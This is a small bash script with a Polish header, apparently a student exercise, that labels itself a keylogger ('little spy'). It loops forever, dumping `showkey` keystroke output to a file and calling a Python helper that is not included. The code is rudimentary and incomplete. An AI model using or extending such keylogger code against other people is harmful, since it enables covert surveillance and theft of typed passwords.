#!bin/bash
# Author           : Bartosz Łuczak ( bartosz.luczak0@gmail.com )
# Created On       : 16.04.2017
# Last Modified By : Bartosz Łuczak (bartosz.luczak0@gmail.com)
# Last Modified On : 16.04.2017
# Version          : v.0.9.2
#
# Description      : Mały szpieg (Keylogger)
# Opis
#
# Licensed under GPL (see /usr/share/common-licenses/GPL for more details
# or contact # the Free Software Foundation for a copy)
while [ true ]
do
	showkey > /home/bartek/SO/ds/showkey.txt 
	python /home/bartek/SO/ds/czytaj.py
done
